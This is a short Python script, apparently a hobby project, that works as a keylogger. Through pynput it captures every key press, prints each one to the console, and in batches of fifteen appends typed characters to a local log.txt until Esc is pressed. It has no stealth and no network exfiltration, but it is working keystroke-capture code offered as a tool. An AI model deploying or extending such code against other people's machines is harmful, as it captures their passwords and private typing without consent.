from pynput.keyboard import Key, Listener
import colorama
from colorama import Fore
import os

os.system('cls')
os.system('title Simple Keylogger')

colorama.just_fix_windows_console()

print(Fore.RED + 'gomeskeraunos Simple Python Txt Saver Keylogger')

keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(Fore.RED + "{0} Pressed!".format(key))
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
